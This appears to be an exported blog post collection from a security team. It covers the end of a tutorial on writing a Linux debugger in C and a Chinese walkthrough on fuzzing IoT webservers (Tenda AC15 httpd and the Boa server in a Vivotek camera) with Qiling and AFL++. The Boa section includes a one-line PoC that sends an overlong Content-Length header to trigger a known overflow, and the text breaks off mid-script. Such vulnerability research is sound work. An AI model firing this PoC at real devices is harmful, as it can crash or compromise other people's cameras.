insn-&gt;size;\n        dbg_set_breakpoint_at_address(dbg, next_addr);\n        set_pc(dbg, possible_pc_prev);\n        continue_execution(dbg);                        /*Probably trigger another breakpoint in the function. So we need to disable it when stop*/\n        brk_enable(bp_prev);\n        \n        HASH_FIND_PTR(dbg-&gt;d_brks, &amp;next_addr, bp_prev);\n        if(bp_prev != NULL &amp;&amp; bp_prev-&gt;b_enabled){\n            brk_disable(bp_prev);                       /*disable it*/\n        }\n        if((get_pc(dbg) - 1) == next_addr){             /*we stoped maybe because of triggering int3 below the call. So after continue we should check executed int3*/\n            set_pc(dbg, next_addr);          \n        }\n        cs_free(insn, 1);\n        cs_close(&amp;handle);\n        return;\n    }else if(bp_prev != NULL &amp;&amp; bp_prev-&gt;b_enabled &amp;&amp; bp_prev-&gt;b_saved_data != 0xE8){\n        /*normal instruction has been triggered. Just work as step in*/\n        dbg_step_in(dbg);\n        return;\n    }\n\n    /*stoped for PTRACE_SINGLESTEP*/\n    /*current instruction. Jump over a call but there is 0xcc in current call instruction*/\n    HASH_FIND_PTR(dbg-&gt;d_brks, &amp;possible_pc_currn, bp_currn);\n    if(bp_currn != NULL &amp;&amp; bp_currn-&gt;b_enabled &amp;&amp; bp_currn-&gt;b_saved_data == 0xE8){\n        /*current instruction is breakpoint and it`s a function invoking*/\n        brk_disable(bp_currn);\n        data = ptrace(PTRACE_PEEKDATA, dbg-&gt;d_pid, possible_pc_currn, NULL);\n        csh handle = 0;\n        cs_insn* insn;\n        size_t count;\n        int child_status;\n        if (cs_open(CS_ARCH_X86, CS_MODE_64, &amp;handle)) {\n            printf(\"[error]: Failed to initialize capstone engine!\\n\");\n            exit(-1);\n\t    }\n        cs_disasm(handle, (unsigned char*)&amp;data, 8, possible_pc_currn, 1, &amp;insn);\n        next_addr = possible_pc_currn + insn-&gt;size;\n        dbg_set_breakpoint_at_address(dbg, next_addr);\n        continue_execution(dbg);                        /*Probably trigger another breakpoint in the function. So we need to disable it when stop*/\n        brk_enable(bp_currn);\n        HASH_FIND_PTR(dbg-&gt;d_brks, &amp;next_addr, bp_currn);\n        if(bp_currn != NULL &amp;&amp; bp_currn-&gt;b_enabled){\n            brk_disable(bp_currn);                      /*disable it*/\n        }\n        if((get_pc(dbg) - 1) == next_addr){             /*we stoped maybe because of triggering int3 below the call. So after continue we should check executed int3*/\n            set_pc(dbg, next_addr);          \n        }\n        cs_free(insn, 1);\n        cs_close(&amp;handle);\n        return;\n    }else if(bp_currn != NULL &amp;&amp; bp_currn-&gt;b_enabled &amp;&amp; bp_currn-&gt;b_saved_data != 0xE8){\n        /*current instruction is a breakpoint but not a calling so we could just step over. Just work as step in */\n        dbg_step_in(dbg);\n        show_UI(dbg);\n        return;\n    }\n\n    \n    /*not breakpoint in current invoking OR current normal instruction*/\n    data = ptrace(PTRACE_PEEKDATA, dbg-&gt;d_pid, possible_pc_currn, NULL);\n    if((data &amp; 0xff) == 0xE8){          \n        /*Current instruction is a call.Set breakpoint at next instruction then continue*/\n        csh handle = 0;\n        cs_insn* insn;\n        size_t count;\n        int child_status;\n        if (cs_open(CS_ARCH_X86, CS_MODE_64, &amp;handle)) {\n            printf(\"[error]: Failed to initialize capstone engine!\\n\");\n            exit(-1);\n\t    }\n        cs_disasm(handle, (unsigned char*)&amp;data, 8, possible_pc_currn, 1, &amp;insn);\n        next_addr = possible_pc_currn + insn-&gt;size;\n        dbg_set_breakpoint_at_address(dbg, next_addr);\n        continue_execution(dbg);\n        HASH_FIND_PTR(dbg-&gt;d_brks, &amp;next_addr, bp_currn);\n        if(bp_currn != NULL &amp;&amp; bp_currn-&gt;b_enabled){\n            brk_disable(bp_currn);\n        }\n        if((get_pc(dbg) - 1) == next_addr){             /*we stoped maybe because of triggering int3 below the call. So after continue we should check executed int3*/\n            set_pc(dbg, next_addr);          \n        }\n        cs_free(insn, 1);\n        cs_close(&amp;handle);\n        return;\n    }else\n        dbg_step_in(dbg);           /*Current instruction is normal. Just work as step in*/\n}\n\n\n\n到这里已经具备基本功能了，可以在dbg_handle_command中添加命令支持：\nvoid dbg_handle_command(Debugger *dbg, char *cmd){\n    char *lcmd = strdup(cmd);\n    char *argv[8] = { 0 };    \n    char *command;\n\n    argv[0] = strtok(lcmd, \" \");\n    for(int i = 1; i &lt; 8; i++){\n        argv[i] = strtok(NULL, \" \");\n        if(argv[i] == NULL) break;\n    }\n    command = argv[0];\n    if(command == NULL) return;\n    if(is_prefix(command, \"continue\")){\n        continue_execution(dbg);\n    }else if(is_prefix(command, \"quit\")){\n        exit_debugger(dbg);\n    }else if(is_prefix(command, \"break\")){      /*format: break/b [addr]*/\n        if(argv[1] == NULL)\n            puts(\"command break expect an address!\");\n        else{\n            dbg_set_breakpoint_at_address(dbg, strtoul(argv[1], NULL, 16));\n        }\n    }else if(is_prefix(command, \"register\")){   /*format: reg/r dump OR reg/r read/write [reg] value(hex)*/\n        if(is_prefix(argv[1], \"dump\"))\n            dbg_dump_all_regs(dbg);\n        else if(is_prefix(argv[1], \"read\")){\n            printf(\"value:\\t0x%08lx\\n\", get_register_value(dbg-&gt;d_pid, get_register_from_name(argv[2])));\n        }else if(is_prefix(argv[1], \"write\")){\n            set_register_value(dbg-&gt;d_pid, get_register_from_name(argv[2]), strtoul(argv[3], NULL, 16));\n        }\n    }else if(is_prefix(command, \"memory\")){     /*memory/m read [addr] OR write [addr] [value]*/\n        if(is_prefix(argv[1], \"read\")){\n            printf(\"value:\\t0x%08lx\\n\", dbg_read_memory(dbg, strtoul(argv[2], NULL, 16)));\n        }\n        else if(is_prefix(argv[1], \"write\")){\n            printf(\"0x%08lx\\t-&gt;\\t\", dbg_read_memory(dbg, strtoul(argv[2], NULL, 16)));\n            dbg_write_memory(dbg, strtoul(argv[2], NULL, 16), strtoul(argv[3], NULL, 16));\n            printf(\"0x%08lx\\n\", dbg_read_memory(dbg, strtoul(argv[3], NULL, 16)));\n        }\n    }else if(is_prefix(command, \"step\")){       /*step in OR step over*/\n        if(is_prefix(argv[1], \"in\")){\n            dbg_step_in(dbg);\n        }else if(is_prefix(argv[1], \"over\")){\n            dbg_step_over(dbg);\n        }else{\n            puts(\"Usage: step in / step over\");\n        }\n    }\n    else{\n        fprintf(stderr, \"Unkown command: %s.\\n\", command);\n    }\n\n    return free(lcmd);\n}\n\n这些是目前完成的功能，还有进程和线程支持还未完成\n汇编​    一般debugger是要支持显示汇编的，这里实现的只是在每次单步和触发断点时打印寄存器信息和汇编。可以在每次单步或者触发断点时读取当前pc处的机器码借助capstone反汇编，但需要注意的是对于x86_64架构最长汇编指令为15字节但很少出现比较长的指令，所以实现汇编打印的时候每次仅读取16个字节进行反汇编并打印指令\n/**\n * consider of the longest instruction is 15bytes(x86_64) then we read 16bytes everytime\n * and disassemble it with capstone engine\n * befor invoking show_asm the caller should make sure current pc is not a breakpoint\n*/\nvoid show_asm(Debugger *dbg){\n    csh handle;\n    cs_insn *insn;\n    size_t count;\n    uint8_t *code;\n    size_t size = 15;\n    uint64_t address;\n\n    if(cs_open(CS_ARCH_X86, CS_MODE_64, &amp;handle)){\n        printf(\"[error] cs_open(%d, %d, 0x%08lx)\\n\", CS_ARCH_X86, CS_MODE_64, &amp;handle);\n        exit(-1);\n    }\n    code = calloc(1, 16);\n    address = get_pc(dbg);\n    *(uint64_t *)code = ptrace(PTRACE_PEEKDATA, dbg-&gt;d_pid, address, NULL);\n    *((uint64_t *)code + 1) = ptrace(PTRACE_PEEKDATA, dbg-&gt;d_pid, address + 8, NULL);\n    \n    /*before we show assembly after pc we should consider if there is breakpoint in machine code behind*/\n    Breakpoint *bp = NULL;\n    for(uint64_t i = 0, tmp = address; i &lt; size; i++){\n        HASH_FIND_PTR(dbg-&gt;d_brks, &amp;tmp, bp);\n        if(bp != NULL &amp;&amp; bp-&gt;b_enabled){    \n            *((uint8_t *)code + i) = bp-&gt;b_saved_data;\n        }\n        tmp++;\n    }\n\n    puts(\"-------------------------[Assembly]-------------------------\");\n    insn = cs_malloc(handle);\n    while(cs_disasm_iter(handle, (const uint8_t **)&amp;code, &amp;size, &amp;address, insn)){\n        if(size + insn-&gt;size == 15)\n            printf(\"\\e[96m0x%08lx:\\t%s\\t%s\\t&lt;======RIP\\e[0m\\n\", insn-&gt;address, insn-&gt;mnemonic, insn-&gt;op_str);\n        else\n            printf(\"0x%08lx:\\t%s\\t%s\\n\", insn-&gt;address, insn-&gt;mnemonic, insn-&gt;op_str);  \n    }\n    cs_free(insn, 1);\n    cs_close(&amp;handle);\n}\n\n还有就是如果读取的15个字节中有断点(0xcc)那么反汇编结果是不准确的，因此先遍历是否存在断点并resotre原来的数据再进行反汇编。\n效果​    这里还没有实现多线程/进程调试的功能，源码，但也算有个调试器的架子了\n\n参考\nhttps://github.com/kabeor/Capstone-Engine-Documentation/blob/master/Capstone-Engine%20Documentation.md\n\nWriting a Linux Debugger Part 1: Setup (tartanllama.xyz)：作者讲解非常详细，还涉及源码调试功能，这里就没有加入该功能\n\n一文看懂 | GDB底层实现原理\n\n自己动手写一个GDB｜基本功能\n\nsquarepants0/minidbg: Writing a minidbg on Linux with C (github.com)\n\ntroydhanson/uthash: C macros for hash tables and more (github.com)\n\nantirez/linenoise: A small self-contained alternative to readline and libedit (github.com)\n\n\n","slug":"实现一个简单的调试器","date":"2023-02-23T09:56:45.000Z","categories_index":"二进制","tags_index":"二进制","author_index":"RainSec"},{"id":"dda4d51b385ad6b8fb41614a58891fc8","title":"qiling 框架IotFuzz之Boa","content":"qiling 框架IotFuzz之Boa前言最近在搞Iot的时候接触到Qiling框架，用了一段时间后感觉确实模拟功能挺强大的，还支持Fuzz，于是开始学习对Iot webserver这样的程序进行Fuzz。\n官方给出了类似的例子如Tenda AC15 的httpd的fuzz脚本，但是也就光秃秃一个脚本还是需要自己来一遍才能学到一些东西；因为面向的是Iot webserver的Fuzz因此需要对嵌入式设备中常用web开源框架有一些了解，这里是对于Boa框架的fuzz案例\n\n环境准备：\n\nqiling-dev branch：这里并没有选择直接pip安装，方便修改源码\n\nAFL++：在python中可以import unicornafl就行\n\n```bashgit clone https://github.com/AFLplusplus/AFLplusplus.gitmake -C AFLpluspluscd AFLplusplus/unicorn_mode ; ./build_unicorn_support.sh\n  - 一个坑是最好获取版本高于3.15的`cmake`要不然编译的时候有些cmake参数识别有问题，我遇到的就是:`cmake -S unicorn/ -B unicorn/build -D BUILD_SHARED_LIBS=no`问题\n\n- 需要对Qiling，AFL有些了解\n\n**Fuzz思路**：\nIot设备就连环境模拟都比较棘手就就更别说Fuzz了，但是Qiling提供的`进程快照(snapshot)`功能给了我们一个不错的思路，这也是Qiling官方Fuzz案例的一个思路：**即对某函数部分Fuzz(Partial Fuzz)**\n\n# Tenda-AC15\n\nQiling使用4个脚本来实现对该款路由器上httpd程序的Fuzz\n\n![image-20221213114209793](https://cdn.staticaly.com/gh/L2ksy0d/image-host@master/20230130/image-20221213114209793.1nvl9946t1hc.png)\n\n首先是`saver_tendaac15_httpd.py`用于保存fuzz的起始状态快照，主要代码如下：\n\n```python\ndef save_context(ql, *args, **kw):\n    ql.save(cpu_context=False, snapshot=\"snapshot.bin\")\n\ndef check_pc(ql):\n    print(\"=\" * 50)\n    print(\"Hit fuzz point, stop at PC = 0x%x\" % ql.arch.regs.arch_pc)\n    print(\"=\" * 50)\n    ql.emu_stop()\n\n\ndef my_sandbox(path, rootfs):\n    ql = Qiling(path, rootfs, verbose=QL_VERBOSE.DEBUG)\n    ql.add_fs_mapper(\"/dev/urandom\",\"/dev/urandom\")\n    ql.hook_address(save_context, 0x10930)        #&lt;=======\n    ql.hook_address(patcher, ql.loader.elf_entry)\n    ql.hook_address(check_pc, 0x7a0cc)            #&lt;=======\n    ql.run()\n\n\n\nql.hook_address(save_context, 0x10930)：表示当程序跑到0x10930地址时调用save_context函数将保存此刻模拟状态\n但需要输入来触发程序按照预想的跑到0x10930位置，带上面脚本跑起来后使用addressNat_overflow.sh触发\n#!/bin/sh\n\ncurl -v -H \"X-Requested-With: XMLHttpRequest\" -b \"password=1234\" -e http://localhost:8080/samba.html -H \"Content-Type:application/x-www-form-urlencoded\" --data \"entrys=sync\" --data \"page=CCCCAAAA\" http://localhost:8080/goform/addressNat\n\n那么我们就获得了模拟进程快照snapshot.bin之后fuzz就重复利用该文件启动就行，对应fuzz_tendaac15_httpd.py\ndef main(input_file, enable_trace=False):\n    ql = Qiling([\"rootfs/bin/httpd\"], \"rootfs\", verbose=QL_VERBOSE.DEBUG, console = True if enable_trace else False)\n\n    # save current emulated status\n    ql.restore(snapshot=\"snapshot.bin\")\n\n    # return should be 0x7ff3ca64\n    fuzz_mem=ql.mem.search(b\"CCCCAAAA\")\n    target_address = fuzz_mem[0]\n\n    def place_input_callback(_ql: Qiling, input: bytes, _):\n        _ql.mem.write(target_address, input)\n\n    def start_afl(_ql: Qiling):\n        \"\"\"\n        Callback from inside\n        \"\"\"\n        ql_afl_fuzz(_ql, input_file=input_file, place_input_callback=place_input_callback, exits=[ql.os.exit_point])\n\n    ql.hook_address(callback=start_afl, address=0x10930+8)\n    \n    try:\n        ql.run(begin = 0x10930+4, end = 0x7a0cc+4)\n        os._exit(0)\n    except:\n        if enable_trace:\n            print(\"\\nFuzzer Went Shit\")\n        os._exit(0)        \n\nif __name__ == \"__main__\":\n    if len(sys.argv) == 1:\n        raise ValueError(\"No input file provided.\")\n\n    if len(sys.argv) &gt; 2 and sys.argv[1] == \"-t\":\n        main(sys.argv[2], enable_trace=True)\n    else:\n        main(sys.argv[1])\n\n\n恢复快照：ql.restore(snapshot=”snapshot.bin”)\n\n变异数据缓存定位：fuzz_mem=ql.mem.search(b”CCCCAAAA”)\n\n以hook方式从起始地址附近的开始fuzz：ql.hook_address(callback=start_afl, address=0x10930+8)\n\n\n最后开始Fuzz\n#!/usr/bin/sh\n\nAFL_DEBUG_CHILD_OUTPUT=1 AFL_AUTORESUME=1 AFL_PATH=\"$(realpath ./AFLplusplus)\" PATH=\"$AFL_PATH:$PATH\" ./AFLplusplus/afl-fuzz -i afl_inputs -o afl_outputs -U -- python3 ./fuzz_tendaac15_httpd.py @@\n\n说实话这样连最关键的fuzz范围0x10930，0x7a0cc怎么来的都不知道当时逆向定位这两个地址也是一头雾水毫无特征，还是得自己实操\n因此选定了Boa框架(之前了解过源码)从零开始对其进行Fuzz\nBoa Fuzz选择一个网上有许多漏洞分析的设备：vivetok 摄像头，固件链接；而且webservre为Boa框架\nPoc：\necho -en \"POST /cgi-bin/admin/upgrade.cgi HTTP/1.0\\nContent-Length:AAAAAAAAAAAAAAAAAAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIXXXX\\n\\r\\n\\r\\n\"  | ncat -v 192.168.57.20 80\n\nBoa框架：\n主要处理逻辑在process_requests函数中：\n       /*获取就绪队列并处理*/\ncurrent = request_ready;\n\nwhile (current) {\n    time(&amp;current_time);\n    if (current-&gt;buffer_end &amp;&amp; /* there is data in the buffer */\n        current-&gt;status != DEAD &amp;&amp; current-&gt;status != DONE) {\n        retval = req_flush(current);\n        /*\n         * retval can be -2=error, -1=blocked, or bytes left\n         */\n        if (retval == -2) { /* error */\n            current-&gt;status = DEAD;\n            retval = 0;\n        } else if (retval &gt;= 0) {\n            /* notice the &gt;= which is different from below?\n               Here, we may just be flushing headers.\n               We don't want to return 0 because we are not DONE\n               or DEAD */\n\n            retval = 1;\n        }\n    } else {/*主要处理请求部分在这里*/\n        switch (current-&gt;status) {\n        case READ_HEADER:\n        case ONE_CR:\n        case ONE_LF:\n        case TWO_CR:\n            retval = read_header(current);    //解析request头部，该函数类似与FILE_IO\n            break;                            //函数request内部有8192+1字节的buffer，data的头尾指针等，最终调用\n        case BODY_READ:                       //bytes = read(req-&gt;fd, buffer + req-&gt;client_stream_pos, buf_bytes_left);读取\n            retval = read_body(current);\n            break;\n        case BODY_WRITE:\n            retval = write_body(current);\n            break;\n        case WRITE:\n            retval = process_get(current);\n            break;\n        case PIPE_READ:\n            retval = read_from_pipe(current);\n            break;\n        case PIPE_WRITE:\n            retval = write_from_pipe(current);\n            break;\n        case DONE:\n            /* a non-status that will terminate the request */\n            retval = req_flush(current);\n            /*\n             * retval can be -2=error, -1=blocked, or bytes left\n             */\n            if (retval == -2) { /* error */\n                current-&gt;status = DEAD;\n                retval = 0;\n            } else if (retval &gt; 0) {\n                retval = 1;\n            }\n            break;\n        case DEAD:\n            retval = 0;\n            current-&gt;buffer_end = 0;\n            SQUASH_KA(current);\n            break;\n        default:\n            retval = 0;\n            fprintf(stderr, \"Unknown status (%d), \"\n                    \"closing!\\n\", current-&gt;status);\n            current-&gt;status = DEAD;\n            break;\n        }\n\n    }\n\n主要看中间的Switch case：\n\nread_header：解析request头部，该函数类似FILE_IO函数\nrequest内部有8192+1字节的buffer，data的头尾指针等，最终调用bytes = read(req-&gt;fd, buffer + req-&gt;client_stream_pos, buf_bytes_left);读取client发送的请求\n会提取并解析头部信息\n\n\n对于GET传参，主要使用read_header, read_from_pipe, write_from_pipe完成cgi的调用\n对于POST传参，主要调用read_header, read_body, write_body完成cgi调用\n\n就拿read_header函数来说，厂商应该会在里面增加一些url过虑以及响应处理，在这个摄像头中漏洞也确实出在这个函数：\n\n没有对Content-Length成员做限制；根据源码中提示字符串Unknown status (%d), closing可以轻松定位到这几个函数:\n\n那么接下来就尝试利用Qiling 启动这个程序并且Partial Fuzz函数”read_header”\n模拟启动模拟启动的宗旨(我的)是遇到啥错误修最后一个报错点\n启动模板：\nimport os, sys\nsys.path.append('/home/iot/workspace/Emulator/qiling-dev')\nfrom qiling import Qiling\nfrom qiling.const import QL_INTERCEPT, QL_VERBOSE\n\n\ndef boa_run(path: list, rootfs: str, profile: str = 'default'):\n    ql = Qiling(path, rootfs, profile=profile, verbose=QL_VERBOSE.OFF, multithread=False)\n    \"\"\"setup files\"\"\"\n    ql.add_fs_mapper('/dev/null', '/dev/null')\n\n    \"\"\"hooks\"\"\"\n\n    ql.run()\n    \n\nif __name__ == '__main__':\n    os.chdir('/home/iot/workspace/Emulator/qiling-dev/vivetok')\n    path = ['./rootfs/usr/sbin/httpd', \"-c\", \"/etc/conf.d/boa\", \"-d\"]\n    rootfs = './rootfs'\n    profile = './boa_arm.ql'\n    boa_run(path=path, rootfs=rootfs, profile=profile)\n\n\n尝试启动\n首先遇到的是：gethostbyname:: Success\n在IDA中定位到：\n\n函数原型：\nstruct hostent *gethostbyname(const char *hostname);\nstruct hostent{\n    char *h_name;  //official name\n    char **h_aliases;  //alias list\n    int  h_addrtype;  //host address type\n    int  h_length;  //address lenght\n    char **h_addr_list;  //address list\n}\n\n获取返回的结构体还挺复杂的，问题的原因是 在调用gethostname将获得ql_vm作为主机名所以当以此调用gethostbyname无法获得主机信息，所以hook这个函数，并提前开辟空间存放伪造信息：\n\"\"\"\nstruct hostent{\n    char *h_name;  //official name\n    char **h_aliases;  //alias list\n    int  h_addrtype;  //host address type\n    int  h_length;  //address lenght\n    char **h_addr_list;  //address list\n}\n\"\"\"\ndef hook_memSpace(ql: Qiling):\n    ql.mem.map(0x1000, 0x1000, info='my_hook')\n    data = struct.pack('&lt;IIIII', 0x1100, 0x1100, AF_INET, 4, 0x1100)\n    ql.mem.write(0x1000, data)\n    ql.mem.write(0x1100, b'qiling')\n\ndef lib_gethostbyname(ql: Qiling):\n    args = ql.os.resolve_fcall_params({'name':STRING})\n    print('[gethostbyname]: ' + args['name'])\n    ql.arch.regs.write('r0', 0x1000)\n\n还有一个严重问题就是模拟过程中程序自动采用ipv6协议，这就很烦因为qiling的ipv6协议支持的不是很好\nipv6 socketAttributeError: ‘sockaddr_in’ object has no attribute ‘sin6_addr’\n问题处在对ipv6的系统调用bind：\nelif sa_family == AF_INET6 and ql.os.ipv6:\n    sockaddr_in6 = make_sockaddr_in(abits, endian)\n    sockaddr_obj = sockaddr_in6.from_buffer(data)\n\n    port = ntohs(ql, sockaddr_obj.sin_port)\n    host = inet6_ntoa(sockaddr_obj.sin6_addr.s6_addr)\n\n    if ql.os.bindtolocalhost:\n        host = '::1'\n\n    if not ql.os.root and port &lt;= 1024:\n        port = port + 8000\n\ndef make_sockaddr_in(archbits: int, endian: QL_ENDIAN):\n    Struct = struct.get_aligned_struct(archbits, endian)\n\n    class in_addr(Struct):\n        _fields_ = (\n            ('s_addr', ctypes.c_uint32),\n        )\n\n    class sockaddr_in(Struct):\n        _fields_ = (\n            ('sin_family', ctypes.c_int16),\n            ('sin_port',   ctypes.c_uint16),\n            ('sin_addr',   in_addr),\n            ('sin_zero',   ctypes.c_byte * 8)\n        )\n\n    return sockaddr_in\n\ndef make_sockaddr_in6(archbits: int, endian: QL_ENDIAN):\n    Struct = struct.get_aligned_struct(archbits, endian)\n\n    class in6_addr(Struct):\n        _fields_ = (\n            ('s6_addr', ctypes.c_uint8 * 16),\n        )\n\n    class sockaddr_in6(Struct):\n        _fields_ = (\n            ('sin6_family',   ctypes.c_int16),\n            ('sin6_port',     ctypes.c_uint16),\n            ('sin6_flowinfo', ctypes.c_uint32),\n            ('sin6_addr',     in6_addr),\n            ('sin6_scope_id', ctypes.c_uint32)\n        )\n\n    return sockaddr_in6\n\nmake_sockaddr_in, make_sockaddr_in6基于ctypes构造严格的sockaddr结构体，因为是ipv6所以得用make_sockaddr_in6\n还有就是函数(function) inet6_ntoa: (addr: bytes) -&gt; str需要bytes对象而sockaddr_obj.sin6_addr.s6_addr是cbytes类型所以得bytes转\nsockaddr_in6 = make_sockaddr_in6(abits, endian)\nsockaddr_obj = sockaddr_in6.from_buffer(data)\nport = ntohs(ql, sockaddr_obj.sin6_port)\nhost = inet6_ntoa(bytes(sockaddr_obj.sin6_addr.s6_addr))\n\nOSError: [Errno 98] Address already in use\n还是在调用bind时候，因为qiling会对低于1024的端口bind进行修改：\nif not ql.os.root and port &lt;= 1024:\n        port = port + 8000\n\n而后面还对8080端口进行一次bind，所以这里得改，然后其实就能进入核心处理逻辑了 ：\n\n当然还得看看链接有没有问题：尝试访问又出现问题\n$ echo -en \"GET /index.html HTTP/1.0\\n\\rContent-Length:20\\n\\r\\n\\r\"  | nc -v ::1 9080\nConnection to ::1 9080 port [tcp/*] succeeded!\n\nFile \"/home/iot/workspace/Emulator/qiling-dev-stb/qiling/os/posix/syscall/socket.py\", line 669, in ql_syscall_accept\n    host, port = address\nValueError: too many values to unpack (expected 2)\n\nValueError: too many values to unpack (expected 2)\n经调试原来在python中accept ipv6的连接后会返回一个长度为4的元组的address：\n\n同样的问题还发生在ql_syscall_getsockname：sockname = sock.getsockname()\nTypeError: expected c_ubyte_Array_16 instance, got int\n[x]     Syscall ERROR: ql_syscall_accept DEBUG: expected c_ubyte_Array_16 instance, got int\nTraceback (most recent call last):\n  File \"/home/iot/workspace/Emulator/qiling-dev-stb/qiling/os/posix/posix.py\", line 280, in load_syscall\n    retval = syscall_hook(self.ql, *params)\n  File \"/home/iot/workspace/Emulator/qiling-dev-stb/qiling/os/posix/syscall/socket.py\", line 674, in ql_syscall_accept\n    obj.sin6_addr.s6_addr = inet6_aton(str(host))\nTypeError: expected c_ubyte_Array_16 instance, got int\n\n解决：bytes转cbyts类\nobj.sin6_addr.s6_addr = (ctypes.c_ubyte * 16).from_buffer_copy(inet6_aton(str(host)).to_bytes(16, 'big'))\n\n主要问题就这些(修了挺久的)，然后就可以对一些函数进行fuzz了\nFuzz Partial确定Fuzz范围，这个范围主要是给到ql_afl_fuzz函数，这里是打算Fuzz read_header函数(sub_17F80)，那么从数据入口下手：\n\n读取POST或者GET方法的http包那么肯定要解析处理的，处理完成返回一个状态(源码中retval)来指示下一步处理，找到退出点：\n因此要从0x180F8附近开始Fuzz，然后0x18398表示函数正常退出将执行下一轮fuzz\n脚本模板：\nimport os, sys\nsys.path.append('/home/iot/workspace/Emulator/qiling-dev')\nfrom qiling.const import QL_INTERCEPT, QL_VERBOSE\nfrom qiling import Qiling\n\nfrom qiling.extensions.afl import ql_afl_fuzz\n\n\ndef main(input_file: str, trace: bool = False):\n    ql = Qiling(['./rootfs/usr/sbin/httpd', \"-c\", \"/etc/conf.d/boa\", \"-d\"], rootfs='./rootfs', profile='./boa_arm.ql', verbose=QL_VERBOSE.OFF, console = True if trace else False)\n    ql.restore(snapshot='./context.bin')\n\n\tdef place_input_callback(_ql: Qiling, input: bytes, _):\n        # print(b\"**************** \" + input)\n        _ql.mem.write(target_addr, input)\n        \n    def start_afl(_ql: Qiling):\n        \"\"\"\n        Callback from inside\n        \"\"\"\n        ql_afl_fuzz(_ql, input_file=input_file, place_input_callback=place_input_callback, exits=[0x018398])\n\n    ql.hook_address(callback=start_afl, address=0x180F8)\n\n    try:\n        # ql.debugger = True\n        ql.run(begin=0x180F8)\n        os._exit(0)\n    except:\n        if trace:\n            print(\"\\nFuzzer Went Shit\")\n        os._exit(0)  \n\nif __name__ == \"__main__\":\n    if len(sys.argv) == 1:\n        raise ValueError(\"No input file provided.\")\n    \n    os.chdir('/home/iot/workspace/Emulator/qiling-dev/vivetok')\n    if len(sys.argv) &gt; 2 and sys.argv[1] == \"-t\":\n        main(sys.argv[2], trace=True)\n    else:\n        main(sys.argv[1])\n\n\n\nql.hook_address(callback=start_afl, address=0x180F8)：在执行到0x180F8这个位置时调用start_afl函数\nql.run(begin=0x180F8)：从0x180F8开始执行\nql_afl_fuzz：就是unicornafl提供的fuzz接口uc_afl_fuzz_custom的一个wrapper\nplace_input_callback：ql_afl_fuzz会调用的回调函数，负责写入fuzz数据\n\nFuzz buf根据网上的漏洞分析比对源码框架，利用:\ncho -en \"POST /cgi-bin/admin/upgrade.cgi HTTP/1.0nContent-Length:AAAAAAAAAAAAAAAAAAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIXXXXnrnrn\"  | nc -v ::1 9080\n\n可以触发漏洞，具体位于框架中http头部解析函数：read_header，位于httpd中17F80位置\n那么该如何fuzz呢，根据网上unicorn-afl官方用例和qiling官方用例：buf-fuzz，即定位代码中读取数据位置，然后读取完后劫持搜索特定字符串定位fuzz的buff_addr，当然需要状态保存(当然这个方法肯定不是很严谨，因此后面还会介绍劫持read函数方法)\n快照import os, sys, struct\nfrom socket import AF_INET\nsys.path.append('/home/iot/workspace/Emulator/qiling-dev')\nfrom qiling import Qiling\nfrom qiling.const import QL_INTERCEPT, QL_VERBOSE\nfrom qiling.os.const import STRING\nfrom unicorn.unicorn import UcError\n\"\"\"\nstruct hostent{\n    char *h_name;  //official name\n    char **h_aliases;  //alias list\n    int  h_addrtype;  //host address type\n    int  h_length;  //address lenght\n    char **h_addr_list;  //address list\n}\n\"\"\"\ndef hook_memSpace(ql: Qiling):\n    ql.mem.map(0x1000, 0x1000, info='my_hook')\n    data = struct.pack('&lt;IIIII', 0x1100, 0x1100, AF_INET, 4, 0x1100)\n    ql.mem.write(0x1000, data)\n    ql.mem.write(0x1100, b'qiling')\n\ndef lib_gethostbyname(ql: Qiling):\n    args = ql.os.resolve_fcall_params({'name':STRING})\n    print('[gethostbyname]: ' + args['name'])\n    ql.arch.regs.write('r0', 0x1000)\n    \n\ndef saver(ql: Qiling):\n    print('[!] Hit Saver 0x%X'%(ql.arch.regs.arch_pc))\n    ql.save(cpu_context=False, snapshot='./context.bin')\n    print(ql.mem.search(b'fuck'))\n\n\n#[read(5,  0x4edca,  0x2000)] locate buf\ndef read_syscall(ql: Qiling, fd: int, buf: int, size: int, *args) -&gt; None:\n    print(f'[read({fd}, {buf: #x}, {size: #x})]')\n\ndef boa_run(path: list, rootfs: str, profile: str = 'default'):\n    ql = Qiling(path, rootfs, profile=profile, verbose=QL_VERBOSE.OFF, multithread=False)\n    \"\"\"setup files\"\"\"\n    ql.add_fs_mapper('/dev/null', '/dev/null')\n\n    \"\"\"set ram\"\"\"\n    hook_memSpace(ql)\n\n    \"\"\"hooks\"\"\"\n    ql.os.set_api('gethostbyname', lib_gethostbyname, QL_INTERCEPT.CALL)\n    ql.os.set_syscall('read', read_syscall, QL_INTERCEPT.ENTER)\n\n    \"\"\"setup saver\"\"\"\n    ql.hook_address(saver, 0x0180FC)        #read finish\n\n    ql.run()\n    \n\n\nif __name__ == '__main__':\n    os.chdir('/home/iot/workspace/Emulator/qiling-dev/vivetok')\n    path = ['./rootfs/usr/sbin/httpd', \"-c\", \"/etc/conf.d/boa\", \"-d\"]\n    rootfs = './rootfs'\n    profile = './boa_arm.ql'\n    boa_run(path=path, rootfs=rootfs, profile=profile)\n\n然后使用poc触发就行\nfuzzimport os, sys, struct\nimport capstone as Cs\nsys.path.append('/home/iot/workspace/Emulator/qiling-dev')\nfrom qiling.const import QL_INTERCEPT, QL_VERBOSE\nfrom qiling import Qiling\nfrom qiling.extensions.afl import ql_afl_fuzz\n\ndef simple_diassembler(ql: Qiling, address: int, size: int, md: Cs) -&gt; None:\n    buf = ql.mem.read(address, size)\n\n    for insn in md.disasm(buf, address):\n        ql.log.debug(f':: {insn.address:#x} : {insn.mnemonic:24s} {insn.op_str}')\n\ndef main(input_file: str, trace: bool = False):\n    ql = Qiling(['./rootfs/usr/sbin/httpd', \"-c\", \"/etc/conf.d/boa\", \"-d\"], rootfs='./rootfs', profile='./boa_arm.ql', verbose=QL_VERBOSE.OFF, console = True if trace else False)\n    ql.restore(snapshot='./context.bin')\n\n    fuzz_mem = ql.mem.search(b'fuck')\n    \n    target_addr = fuzz_mem[0]\n\n    def place_input_callback(_ql: Qiling, input: bytes, _):\n        # print(b\"**************** \" + input)\n        _ql.mem.write(target_addr, input)\n        \n\n    def start_afl(_ql: Qiling):\n        \"\"\"\n        Callback from inside\n        \"\"\"\n        ql_afl_fuzz(_ql, input_file=input_file, place_input_callback=place_input_callback, exits=[0x018398])\n\n    ql.hook_address(callback=start_afl, address=0x0180FC+4)\n    # 